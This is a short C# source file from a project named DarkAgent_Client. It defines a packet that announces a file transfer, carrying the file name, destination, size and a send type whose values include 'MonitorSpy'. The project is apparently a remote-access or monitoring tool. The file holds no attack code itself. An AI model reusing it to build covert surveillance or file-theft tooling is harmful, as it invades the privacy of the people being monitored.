using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Objects;

namespace DarkAgent_Client.src.Network.FileNetwork.Packets.Send
{
    public class S_FileTransferSendBegin : SendBasePacket
    {
        private FileTransfer info;
        private SendType type;
        public S_FileTransferSendBegin(FileTransferConnect client, FileTransfer info, SendType type)
            : base(client)
        {
            this.info = info;
            this.type = type;
        }

        public enum SendType
        {
            FileManager = 0,
            MonitorSpy = -1
        }

        protected internal override void Write()
        {
            WriteByte(0x00);
            WriteShort(info.Id);
            WriteString(info.FileName);
            WriteString(info.Destination);
            WriteLong(info.FileSize);
            WriteShort((short)type);
        }
    }
}
